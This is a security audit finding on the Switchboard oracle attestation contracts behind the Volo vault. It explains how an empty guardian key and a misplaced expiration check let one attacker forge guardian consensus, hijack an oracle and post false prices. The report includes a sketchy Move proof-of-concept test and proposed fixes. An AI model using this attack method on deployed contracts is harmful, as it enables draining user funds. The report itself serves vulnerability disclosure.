# Audit Report

## Title
Oracle Attestation Count Manipulation via Unvalidated Guardian Oracles

## Summary
A critical vulnerability in the Switchboard oracle attestation system allows an attacker to create unlimited malicious guardian oracles and use them to bypass the min_attestations security check. Two bugs enable this: (1) incorrect expiration validation that checks the target oracle instead of the guardian oracle, and (2) empty secp256k1_key bypassing signature verification. The attacker can hijack legitimate oracles with attacker-controlled keys, enabling arbitrary price manipulation in the Volo vault system.

## Finding Description

The vulnerability exists in the oracle attestation validation flow through two critical bugs:

**Bug #1 - Incorrect Expiration Validation:**

The attestation validation incorrectly validates the target oracle's expiration instead of the guardian's expiration. [1](#0-0) 

The error constant confirms the intent was to validate the guardian. [2](#0-1) 

This allows unattested guardians (with expiration_time_ms = 0) to attest to any already-enabled oracle.

**Bug #2 - Empty Key Signature Bypass:**

The signature verification uses check_subvec to match the recovered public key against the guardian's secp256k1_key. [3](#0-2) 

However, when the guardian's secp256k1_key is empty (as it is for newly created oracles), the check_subvec function returns true without performing any verification. [4](#0-3) 

When v2.length() is 0, the while loop never executes and the function returns true, accepting any signature.

**Exploitation Flow:**

1. Attacker creates multiple guardian oracles via the public entry function with no authorization checks. [5](#0-4) 

2. Each newly created guardian oracle has an empty secp256k1_key. [6](#0-5) 

3. The attacker calls the public attestation entry function multiple times with different malicious guardians. [7](#0-6) 

4. Each attestation is added with a unique guardian_id, and the filter only prevents duplicate attestations from the same guardian. [8](#0-7) 

5. Once the valid attestation count reaches the minimum threshold, the oracle is re-enabled with the attacker's secp256k1_key. [9](#0-8) 

6. The attacker can now submit arbitrary price updates to aggregators using the compromised oracle. [10](#0-9) 

7. Volo vault relies on these Switchboard aggregators for all asset price valuations. [11](#0-10) 

## Impact Explanation

**Critical Fund Impact:** The Volo vault uses Switchboard oracle prices for calculating USD values of all assets, which directly affects:
- Share ratio calculations during deposits and withdrawals
- Loss tolerance enforcement during vault operations  
- Asset valuation across all DeFi adaptors (Navi, Cetus, Suilend, Momentum)

An attacker controlling oracle keys can submit arbitrary false prices to:
- Manipulate share valuations to extract value during deposits/withdrawals
- Bypass loss_tolerance limits by reporting inflated asset values
- Drain vault funds through systematic price manipulation

**Security Integrity Compromise:** The min_attestations requirement (typically 3-5 independent guardians) is a core security mechanism designed to require consensus from multiple trusted entities. This vulnerability completely breaks this guarantee by allowing a single attacker to create unlimited fake guardians and achieve any attestation threshold.

**Affected Parties:** All Volo vault users are affected, as oracle pricing impacts every vault operation. The entire protocol's economic security depends on accurate oracle data.

## Likelihood Explanation

**High Likelihood - All Preconditions Met:**

1. **No Authorization Required:** Both entry functions are public with no capability checks or authorization requirements.

2. **Minimal Cost:** Attack requires only gas fees (~0.1 SUI total for creating 5-10 guardian oracles and attestations).

3. **Simple Execution:** No complex state manipulation, timing dependencies, or external compromises needed. Just repeated calls to public functions.

4. **Feasible Preconditions:** Guardian and oracle queues exist in production Volo deployment. Target oracles are already enabled for normal operation.

5. **Fast Execution:** Attacker can create multiple guardians and complete attestations in under a minute, faster than any monitoring system could respond.

6. **High Economic Incentive:** Potential profit is unlimited - attacker can drain entire vault value by manipulating prices, then executing profitable deposit/withdrawal cycles.

## Recommendation

**Fix Bug #1 - Correct Expiration Check:**
```move
// Change line 67 from:
assert!(oracle.expiration_time_ms() > clock.timestamp_ms(), EGuardianInvalid);
// To:
assert!(guardian.expiration_time_ms() > clock.timestamp_ms(), EGuardianInvalid);
```

**Fix Bug #2 - Reject Empty Keys:**
```move
// Add check before signature verification at line 92:
assert!(!guardian.secp256k1_key().is_empty(), EGuardianInvalid);
assert!(hash::check_subvec(&recovered_pubkey, &guardian.secp256k1_key(), 1), EInvalidSignature);
```

**Additional Hardening:**
- Add access control to oracle_init_action::run() to restrict guardian oracle creation to authorized entities
- Implement rate limiting on attestation submissions
- Add monitoring for unusual patterns of guardian creation from single addresses

## Proof of Concept

```move
#[test]
fun test_attestation_manipulation() {
    use sui::test_scenario;
    use sui::clock;
    use switchboard::oracle_init_action;
    use switchboard::oracle_attest_action;
    use switchboard::queue;
    
    let attacker = @0xBAD;
    let mut scenario = test_scenario::begin(attacker);
    let mut clock = clock::create_for_testing(scenario.ctx());
    
    // Setup: Create guardian queue and target oracle
    let guardian_queue_id = setup_guardian_queue(&mut scenario);
    let target_oracle_id = setup_enabled_oracle(&mut scenario);
    
    // Step 1: Attacker creates multiple malicious guardian oracles
    let mut guardian_ids = vector::empty();
    let mut i = 0;
    while (i < 5) {
        test_scenario::next_tx(&mut scenario, attacker);
        let guardian_key = generate_unique_key(i);
        oracle_init_action::run(
            guardian_key,
            &mut guardian_queue,
            scenario.ctx()
        );
        vector::push_back(&mut guardian_ids, get_last_oracle_id());
        i = i + 1;
    };
    
    // Step 2: Use malicious guardians to attest to target oracle
    i = 0;
    while (i < 5) {
        test_scenario::next_tx(&mut scenario, attacker);
        let guardian = get_oracle(guardian_ids[i]);
        let fake_signature = generate_any_ecdsa_signature(); // Any signature works!
        
        oracle_attest_action::run(
            &mut target_oracle,
            &guardian_queue,
            &guardian,
            current_timestamp(),
            attacker_mr_enclave,
            attacker_secp256k1_key, // Attacker's key
            fake_signature,
            &clock
        );
        i = i + 1;
    };
    
    // Step 3: Verify oracle was hijacked
    assert!(target_oracle.secp256k1_key() == attacker_secp256k1_key);
    
    // Step 4: Submit fake price to aggregator
    test_scenario::next_tx(&mut scenario, attacker);
    aggregator_submit_result_action::run(
        &mut price_aggregator,
        &queue,
        999999999, // Fake inflated price
        false,
        current_timestamp(),
        &target_oracle, // Now controlled by attacker
        sign_with_attacker_key(),
        &clock,
        fee_coin
    );
    
    // Price manipulation successful - vault now uses fake prices
    assert!(price_aggregator.current_result().value() == 999999999);
}
```

## Notes

This vulnerability represents a complete breakdown of the oracle security model. The Switchboard attestation mechanism is designed to ensure multiple independent guardians verify an oracle's authenticity before it can submit price data. By bypassing both the expiration check and signature verification, an attacker can single-handedly create a "consensus" of fake guardians and hijack any oracle.

The impact on Volo vault is immediate and severe, as the protocol has no secondary price validation mechanism and trusts Switchboard prices directly for all financial calculations. This creates a single point of failure where oracle compromise leads to complete vault drainage.

### Citations

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_attest_action.move (L16-16)
```text
const EGuardianInvalid: vector<u8> = b"Guardian is invalid";
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_attest_action.move (L67-67)
```text
    assert!(oracle.expiration_time_ms() > clock.timestamp_ms(), EGuardianInvalid);
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_attest_action.move (L92-92)
```text
    assert!(hash::check_subvec(&recovered_pubkey, &guardian.secp256k1_key(), 1), EInvalidSignature);
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_attest_action.move (L120-132)
```text
    let valid_attestations = oracle.valid_attestation_count(secp256k1_key);
    if (valid_attestations >= queue.min_attestations()) {
        let expiration_time_ms = clock.timestamp_ms() + queue.oracle_validity_length_ms();
        oracle.enable_oracle(secp256k1_key, mr_enclave, expiration_time_ms);
        
        // emit resolution event
        let attestation_resolved = AttestationResolved {
            oracle_id: oracle.id(),
            secp256k1_key,
            timestamp_ms: clock.timestamp_ms(),
        };
        event::emit(attestation_resolved);
    };
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_attest_action.move (L135-164)
```text
public entry fun run(
    oracle: &mut Oracle,
    queue: &Queue,
    guardian: &Oracle,
    timestamp_seconds: u64,
    mr_enclave: vector<u8>,
    secp256k1_key: vector<u8>,
    signature: vector<u8>,
    clock: &Clock,
) {
    validate(
        oracle,
        queue,
        guardian,
        timestamp_seconds,
        mr_enclave,
        secp256k1_key,
        signature,
        clock,
    );
    actuate(
        oracle,
        queue,
        guardian,
        timestamp_seconds,
        mr_enclave,
        secp256k1_key,
        clock,
    );
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/utils/hash.move (L156-171)
```text
public fun check_subvec(v1: &vector<u8>, v2: &vector<u8>, start_idx: u64): bool {
    if (v1.length() < start_idx + v2.length()) {
        return false
    };

    let mut iterations = v2.length();
    while (iterations > 0) {
        let idx = iterations - 1;
        if (v1[start_idx + idx] != v2[idx]) {
            return false
        };
        iterations = iterations - 1;
    };

    true
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_init_action.move (L50-64)
```text
public entry fun run(
    oracle_key: vector<u8>,
    queue: &mut Queue,
    ctx: &mut TxContext
) {   
    validate(
        &oracle_key,
        queue,
    );
    actuate(
        queue,
        oracle_key,
        ctx,
    );
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/schemas/oracle.move (L78-79)
```text
        expiration_time_ms: 0,
        secp256k1_key: vector::empty(),
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/schemas/oracle.move (L100-105)
```text
public(package) fun add_attestation(oracle: &mut Oracle, attestation: Attestation, timestamp_ms: u64) {
    oracle.valid_attestations = vector::filter!(oracle.valid_attestations, |a: &Attestation| {
        a.timestamp_ms + ATTESTATION_TIMEOUT_MS > timestamp_ms && a.guardian_id != attestation.guardian_id
    });
    vector::push_back(&mut oracle.valid_attestations, attestation);
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/aggregator/aggregator_submit_result_action.move (L63-91)
```text
    assert!(oracle.expiration_time_ms() > clock.timestamp_ms(), EOracleInvalid);

    // make sure that update staleness point is not in the future
    assert!(timestamp_seconds * 1000 + aggregator.max_staleness_seconds() * 1000 >= clock.timestamp_ms(), ETimestampInvalid);

    // check that the signature is valid length
    assert!(signature.length() == 65, ESignatureInvalid);

    // check that the signature is valid
    let update_msg = hash::generate_update_msg(
        value,
        oracle.queue_key(),
        aggregator.feed_hash(),
        x"0000000000000000000000000000000000000000000000000000000000000000",
        aggregator.max_variance(),
        aggregator.min_responses(),
        timestamp_seconds,
    );

    // recover the pubkey from the signature
    let recovered_pubkey_compressed = ecdsa_k1::secp256k1_ecrecover(
        &signature, 
        &update_msg, 
        1,
    );
    let recovered_pubkey = ecdsa_k1::decompress_pubkey(&recovered_pubkey_compressed);

    // check that the recovered pubkey is valid
    assert!(hash::check_subvec(&recovered_pubkey, &oracle.secp256k1_key(), 1), ERecoveredPubkeyInvalid);
```

**File:** volo-vault/sources/oracle.move (L126-138)
```text
public fun get_asset_price(config: &OracleConfig, clock: &Clock, asset_type: String): u256 {
    config.check_version();

    assert!(table::contains(&config.aggregators, asset_type), ERR_AGGREGATOR_NOT_FOUND);

    let price_info = &config.aggregators[asset_type];
    let now = clock.timestamp_ms();

    // Price must be updated within update_interval
    assert!(price_info.last_updated.diff(now) < config.update_interval, ERR_PRICE_NOT_UPDATED);

    price_info.price
}
```
